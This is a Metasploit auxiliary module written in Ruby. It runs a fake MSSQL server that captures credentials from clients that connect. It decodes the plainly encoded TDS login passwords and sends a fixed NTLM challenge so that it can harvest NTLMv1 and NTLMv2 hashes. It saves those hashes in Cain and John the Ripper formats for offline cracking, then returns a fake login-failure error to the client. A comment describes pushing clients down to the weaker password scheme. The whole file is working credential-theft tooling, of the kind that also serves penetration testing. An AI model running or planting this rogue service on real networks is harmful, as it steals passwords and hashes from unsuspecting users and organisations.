##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex/proto/ntlm/constants'
require 'rex/proto/ntlm/message'
require 'rex/proto/ntlm/crypt'

NTLM_CONST = Rex::Proto::NTLM::Constants
NTLM_CRYPT = Rex::Proto::NTLM::Crypt
MESSAGE = Rex::Proto::NTLM::Message

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::Remote::SMBServer
  include Msf::Auxiliary::Report

  class Constants
    TDS_MSG_RESPONSE  = 0x04
    TDS_MSG_LOGIN     = 0x10
    TDS_MSG_SSPI      = 0x11
    TDS_MSG_PRELOGIN  = 0x12

    TDS_TOKEN_ERROR   = 0xAA
    TDS_TOKEN_AUTH    = 0xED
  end

  def initialize
    super(
      'Name'           => 'Authentication Capture: MSSQL',
      'Description'    => %q{
        This module provides a fake MSSQL service that
      is designed to capture authentication credentials. The modules
      supports both the weak encoded database logins as well as Windows
      logins (NTLM).
      },
      'Author'         => 'Patrik Karlsson <patrik[at]cqure.net>',
      'License'        => MSF_LICENSE,
      'Actions'        => [ [ 'Capture' ] ],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction'  => 'Capture'
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 1433 ]),
        OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
        OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
        OptString.new('CHALLENGE',   [ true, "The 8 byte challenge ", "1122334455667788" ])
      ], self.class)

    register_advanced_options(
      [
        OptBool.new("SMB_EXTENDED_SECURITY", [ true, "Use smb extended security negociation, when set client will use ntlmssp, if not then client will use classic lanman authentification", false ]),
        OptString.new('DOMAIN_NAME',         [ true, "The domain name used during smb exchange with smb extended security set ", "anonymous" ])
      ], self.class)

  end

  def setup
    super
    @state = {}
  end

  def run
    @s_smb_esn = datastore['SMB_EXTENDED_SECURITY']
    @domain_name = datastore['DOMAIN_NAME']
    if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{16})$/
      @challenge = [ datastore['CHALLENGE'] ].pack("H*")
    else
      print_error("CHALLENGE syntax must match 1122334455667788")
      return
    end

    #those variables will prevent to spam the screen with identical hashes (works only with ntlmv1)
    @previous_lm_hash="none"
    @previous_ntlm_hash="none"

    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")

    exploit()
  end

  def on_client_connect(c)
    @state[c] = {
      :name    => "#{c.peerhost}:#{c.peerport}",
      :ip      => c.peerhost,
      :port    => c.peerport,
      :user    => nil,
      :pass    => nil
    }
  end

  # decodes a mssql password
  def mssql_tds_decrypt(pass)
    Rex::Text.to_ascii(pass.unpack("C*").map {|c| ((( c ^ 0xa5 ) & 0x0F) << 4) | ((( c ^ 0xa5 ) & 0xF0 ) >> 4) }.pack("C*"))
  end

  # doesn't do any real parsing, slices of the data
  def mssql_parse_prelogin(data, info)
    status = data.slice!(0,1).unpack('C')[0]
    len = data.slice!(0,2).unpack('n')[0]

    # just slice away the rest of the packet
    data.slice!(0, len - 4)
    return []
  end

  # parses a login packet sent to the server
  def mssql_parse_login(data, info)
    status = data.slice!(0,1).unpack('C')[0]
    len = data.slice!(0,2).unpack('n')[0]

    if len > data.length + 4
      info[:errors] << "Login packet to short"
      return
    end

    # slice of:
    #   * channel, packetno, window
    #   * login header
    #   * client name lengt & offset
    login_hdr = data.slice!(0,4 + 36 + 4)

    username_offset = data.slice!(0,2).unpack('v')[0]
    username_length = data.slice!(0,2).unpack('v')[0]

    pw_offset = data.slice!(0,2).unpack('v')[0]
    pw_length = data.slice!(0,2).unpack('v')[0]

    appname_offset = data.slice!(0,2).unpack('v')[0]
    appname_length = data.slice!(0,2).unpack('v')[0]

    srvname_offset = data.slice!(0,2).unpack('v')[0]
    srvname_length = data.slice!(0,2).unpack('v')[0]

    if username_offset > 0 and pw_offset > 0
      offset = username_offset - 56
      info[:user] = Rex::Text::to_ascii(data[offset..(offset + username_length * 2)])

      offset = pw_offset - 56
      if pw_length == 0
        info[:pass] = "<empty>"
      else
        info[:pass] = mssql_tds_decrypt(data[offset..(offset + pw_length * 2)].unpack("A*")[0])
      end

      offset = srvname_offset - 56
      info[:srvname] = Rex::Text::to_ascii(data[offset..(offset + srvname_length * 2)])
    else
      info[:isntlm?]= true
    end

    # slice of remaining packet
    data.slice!(0, data.length)

    info
  end

  # copied and slightly modified from http_ntlm html_get_hash
  def mssql_get_hash(arg = {})
    ntlm_ver = arg[:ntlm_ver]
    if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE or ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE
      lm_hash = arg[:lm_hash]
      nt_hash = arg[:nt_hash]
    else
      lm_hash = arg[:lm_hash]
      nt_hash = arg[:nt_hash]
      lm_cli_challenge = arg[:lm_cli_challenge]
      nt_cli_challenge = arg[:nt_cli_challenge]
    end
    domain = arg[:domain]
    user = arg[:user]
    host = arg[:host]
    ip = arg[:ip]

    unless @previous_lm_hash == lm_hash and @previous_ntlm_hash == nt_hash then
      @previous_lm_hash = lm_hash
      @previous_ntlm_hash = nt_hash
      # Check if we have default values (empty pwd, null hashes, ...) and adjust the on-screen messages correctly
      case ntlm_ver
      when NTLM_CONST::NTLM_V1_RESPONSE
        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
          :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'ntlm' })
          print_status("NLMv1 Hash correspond to an empty password, ignoring ... ")
          return
        end
        if (lm_hash == nt_hash or lm_hash == "" or lm_hash =~ /^0*$/ ) then
          lm_hash_message = "Disabled"
        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack("H*"),:srv_challenge => @challenge,
          :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'lm' })
          lm_hash_message = "Disabled (from empty password)"
        else
          lm_hash_message = lm_hash
          lm_chall_message = lm_cli_challenge
        end
      when NTLM_CONST::NTLM_V2_RESPONSE
        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
          :cli_challenge => [nt_cli_challenge].pack("H*"),
          :user => Rex::Text::to_ascii(user),
          :domain => Rex::Text::to_ascii(domain),
          :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'ntlm' })
          print_status("NTLMv2 Hash correspond to an empty password, ignoring ... ")
          return
        end
        if lm_hash == '0' * 32 and lm_cli_challenge == '0' * 16
          lm_hash_message = "Disabled"
          lm_chall_message = 'Disabled'
        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack("H*"),:srv_challenge => @challenge,
          :cli_challenge => [lm_cli_challenge].pack("H*"),
          :user => Rex::Text::to_ascii(user),
          :domain => Rex::Text::to_ascii(domain),
          :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'lm' })
          lm_hash_message = "Disabled (from empty password)"
          lm_chall_message = 'Disabled'
        else
          lm_hash_message = lm_hash
          lm_chall_message = lm_cli_challenge
        end
      when NTLM_CONST::NTLM_2_SESSION_RESPONSE
        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
          :cli_challenge => [lm_hash].pack("H*")[0,8],
          :ntlm_ver => NTLM_CONST::NTLM_2_SESSION_RESPONSE, :type => 'ntlm' })
          print_status("NTLM2_session Hash correspond to an empty password, ignoring ... ")
          return
        end
        lm_hash_message = lm_hash
        lm_chall_message = lm_cli_challenge
      end

      # Display messages
      domain = Rex::Text::to_ascii(domain)
      user = Rex::Text::to_ascii(user)

      capturedtime = Time.now.to_s
      case ntlm_ver
      when NTLM_CONST::NTLM_V1_RESPONSE
        smb_db_type_hash = "smb_netv1_hash"
        capturelogmessage =
        "#{capturedtime}\nNTLMv1 Response Captured from #{host} \n" +
        "DOMAIN: #{domain} USER: #{user} \n" +
        "LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} \nNTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n"
      when NTLM_CONST::NTLM_V2_RESPONSE
        smb_db_type_hash = "smb_netv2_hash"
        capturelogmessage =
        "#{capturedtime}\nNTLMv2 Response Captured from #{host} \n" +
        "DOMAIN: #{domain} USER: #{user} \n" +
        "LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} " +
        "LM_CLIENT_CHALLENGE:#{lm_chall_message ? lm_chall_message : "<NULL>"}\n" +
        "NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
        "NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : "<NULL>"}\n"
      when NTLM_CONST::NTLM_2_SESSION_RESPONSE
        #we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
        #also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
        smb_db_type_hash = "smb_netv1_hash"
        capturelogmessage =
        "#{capturedtime}\nNTLM2_SESSION Response Captured from #{host} \n" +
        "DOMAIN: #{domain} USER: #{user} \n" +
        "NTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n" +
        "NT_CLIENT_CHALLENGE:#{lm_hash_message ? lm_hash_message[0,16] : "<NULL>"} \n"

      else # should not happen
        return
      end

      print_status(capturelogmessage)

      # DB reporting
      # Rem :  one report it as a smb_challenge on port 445 has breaking those hashes
      # will be mainly use for psexec / smb related exploit
      report_auth_info(
        :host  => arg[:ip],
        :port => 445,
        :sname => 'smb_client',
        :user => user,
        :pass => domain + ":" +
        ( lm_hash + lm_cli_challenge.to_s ? lm_hash + lm_cli_challenge.to_s : "00" * 24 ) + ":" +
        ( nt_hash + nt_cli_challenge.to_s ? nt_hash + nt_cli_challenge.to_s :  "00" * 24 ) + ":" +
        datastore['CHALLENGE'].to_s,
        :type => smb_db_type_hash,
        :proof => "DOMAIN=#{domain}",
        :source_type => "captured",
        :active => true
      )
      #if(datastore['LOGFILE'])
      #	File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
      #end

      if(datastore['CAINPWFILE'] and user)
        if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE or ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE
          fd = File.open(datastore['CAINPWFILE'], "ab")
          fd.puts(
          [
            user,
            domain ? domain : "NULL",
            @challenge.unpack("H*")[0],
            lm_hash ? lm_hash : "0" * 48,
            nt_hash ? nt_hash : "0" * 48
            ].join(":").gsub(/\n/, "\\n")
            )
            fd.close
        end
      end

      if(datastore['JOHNPWFILE'] and user)
        case ntlm_ver
        when NTLM_CONST::NTLM_V1_RESPONSE, NTLM_CONST::NTLM_2_SESSION_RESPONSE
          fd = File.open(datastore['JOHNPWFILE'] + '_netntlm', "ab")
          fd.puts(
          [
            user,"",
            domain ? domain : "NULL",
            lm_hash ? lm_hash : "0" * 48,
            nt_hash ? nt_hash : "0" * 48,
            @challenge.unpack("H*")[0]
            ].join(":").gsub(/\n/, "\\n")
            )
            fd.close
        when NTLM_CONST::NTLM_V2_RESPONSE
          #lmv2
          fd = File.open(datastore['JOHNPWFILE'] + '_netlmv2', "ab")
          fd.puts(
            [
              user,"",
              domain ? domain : "NULL",
              @challenge.unpack("H*")[0],
              lm_hash ? lm_hash : "0" * 32,
              lm_cli_challenge ? lm_cli_challenge : "0" * 16
            ].join(":").gsub(/\n/, "\\n")
          )
          fd.close
          #ntlmv2
          fd = File.open(datastore['JOHNPWFILE'] + '_netntlmv2' , "ab")
          fd.puts(
            [
              user,"",
              domain ? domain : "NULL",
              @challenge.unpack("H*")[0],
              nt_hash ? nt_hash : "0" * 32,
              nt_cli_challenge ? nt_cli_challenge : "0" * 160
              ].join(":").gsub(/\n/, "\\n")
          )
          fd.close
        end
      end
    end
  end

  def mssql_parse_ntlmsspi(data, info)
    start = data.index('NTLMSSP')
    if start
      data.slice!(0,start)
    else
      print_error("Failed to find NTLMSSP authentication blob")
      return
    end

    ntlm_message = NTLM_MESSAGE::parse(data)
    case ntlm_message
    when NTLM_MESSAGE::Type3
      lm_len = ntlm_message.lm_response.length # Always 24
      nt_len = ntlm_message.ntlm_response.length

      if nt_len == 24 #lmv1/ntlmv1 or ntlm2_session
        arg = {	:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
          :lm_hash => ntlm_message.lm_response.unpack('H*')[0],
          :nt_hash => ntlm_message.ntlm_response.unpack('H*')[0]
        }

        if @s_ntlm_esn && arg[:lm_hash][16,32] == '0' * 32
          arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
        end
        #if the length of the ntlm response is not 24 then it will be bigger and represent
        # a ntlmv2 response
      elsif nt_len > 24 #lmv2/ntlmv2
        arg = {	:ntlm_ver 		=> NTLM_CONST::NTLM_V2_RESPONSE,
          :lm_hash 		=> ntlm_message.lm_response[0, 16].unpack('H*')[0],
          :lm_cli_challenge 	=> ntlm_message.lm_response[16, 8].unpack('H*')[0],
          :nt_hash 		=> ntlm_message.ntlm_response[0, 16].unpack('H*')[0],
          :nt_cli_challenge 	=> ntlm_message.ntlm_response[16, nt_len - 16].unpack('H*')[0]
        }
      elsif nt_len == 0
        print_status("Empty hash from #{smb[:name]} captured, ignoring ... ")
        return
      else
        print_status("Unknown hash type from #{smb[:name]}, ignoring ...")
        return
      end

      arg[:user] = ntlm_message.user
      arg[:domain]   = ntlm_message.domain
      arg[:ip] = info[:ip]
      arg[:host] = info[:ip]

      begin
        mssql_get_hash(arg)
      rescue ::Exception => e
        print_error("Error processing Hash from #{smb[:name]} : #{e.class} #{e} #{e.backtrace}")
      end
    else
      info[:errors] << "Unsupported NTLM authentication message type"
    end

    # slice of remainder
    data.slice!(0,data.length)
  end

  #
  # Parse individual tokens from a TDS reply
  #
  def mssql_parse_reply(data, info)
    info[:errors] = []
    return if not data
    until data.empty? or ( info[:errors] and not info[:errors].empty? )
      token = data.slice!(0,1).unpack('C')[0]
      case token
      when Constants::TDS_MSG_LOGIN
        mssql_parse_login(data, info)
        info[:type] = Constants::TDS_MSG_LOGIN
      when Constants::TDS_MSG_PRELOGIN
        mssql_parse_prelogin(data, info)
        info[:type] = Constants::TDS_MSG_PRELOGIN
      when Constants::TDS_MSG_SSPI
        mssql_parse_ntlmsspi(data, info)
        info[:type] = Constants::TDS_MSG_SSPI
      else
        info[:errors] << "unsupported token: #{token}"
      end
    end
    info
  end

  # Sends an error message to the MSSQL client
  def mssql_send_error(c, msg)
    data = [
      Constants::TDS_MSG_RESPONSE,
      1, # status
      0x0020 + msg.length * 2,
      0x0037, # channel: 55
      0x01,   # packet no: 1
      0x00,   # window: 0
      Constants::TDS_TOKEN_ERROR,
      0x000C + msg.length * 2,
      18456,  # SQL Error number
      1,      # state: 1
      14,     # severity: 14
      msg.length,   # error msg length
      0,
      Rex::Text::to_unicode(msg),
      0, # server name length
      0, # process name length
      0, # line number
      "fd0200000000000000"
      ].pack("CCnnCCCvVCCCCA*CCnH*")
    c.put data
  end

  def mssql_send_ntlm_challenge(c, info)
    win_domain = Rex::Text.to_unicode(@domain_name.upcase)
    win_name = Rex::Text.to_unicode(@domain_name.upcase)
    dns_domain = Rex::Text.to_unicode(@domain_name.downcase)
    dns_name = Rex::Text.to_unicode(@domain_name.downcase)

    if @s_ntlm_esn
      sb_flag = 0xe28a8215 # ntlm2
    else
      sb_flag = 0xe2828215 #no ntlm2
    end

    securityblob = NTLM_UTILS::make_ntlmssp_blob_chall( win_domain,
      win_name,
      dns_domain,
      dns_name,
      @challenge,
      sb_flag)

    data = [
      Constants::TDS_MSG_RESPONSE,
      1, # status
      11 + securityblob.length, # length
      0x0000, # channel
      0x01,   # packetno
      0x00,   # window
      Constants::TDS_TOKEN_AUTH,   # token: authentication
      securityblob.length, # length
      securityblob
    ].pack("CCnnCCCvA*")
    c.put data
  end

  def mssql_send_prelogin_response(c, info)
    data = [
      Constants::TDS_MSG_RESPONSE,
      1, # status
      0x002b, # length
      "0000010000001a00060100200001020021000103002200000400220001ff0a3206510000020000"
    ].pack("CCnH*")
    c.put data
  end

  def on_client_data(c)
    info = {:errors => [], :ip => @state[c][:ip]}
    data = c.get_once
    return if not data

    info = mssql_parse_reply(data, info)

    if(info[:errors] and not info[:errors].empty?)
      print_error("#{info[:errors]}")
      c.close
      return
    end

    # no errors, and the packet was a prelogin
    # if we just close the connection here, it seems that the client:
    # SQL Server Management Studio 2008R2, falls back to the weaker encoded
    # password authentication.
    case info[:type]
    when Constants::TDS_MSG_PRELOGIN
      mssql_send_prelogin_response(c, info)

    when Constants::TDS_MSG_SSPI
      mssql_send_error(c, "Error: Login failed. The login is from an untrusted domain and cannot be used with Windows authentication.")

    when Constants::TDS_MSG_LOGIN
      if info[:isntlm?] == true
        mssql_send_ntlm_challenge(c, info)
      elsif info[:user] and info[:pass]
        report_auth_info(
        :host      => @state[c][:ip],
        :port      => datastore['SRVPORT'],
        :sname     => 'mssql_client',
        :user      => info[:user],
        :pass      => info[:pass],
        :source_type => "captured",
        :active    => true
        )

        print_status("MSSQL LOGIN #{@state[c][:name]} #{info[:user]} / #{info[:pass]}")
        mssql_send_error(c, "Login failed for user '#{info[:user]}'.")

        c.close
      end
    end
  end

  def on_client_close(c)
    @state.delete(c)
  end
end
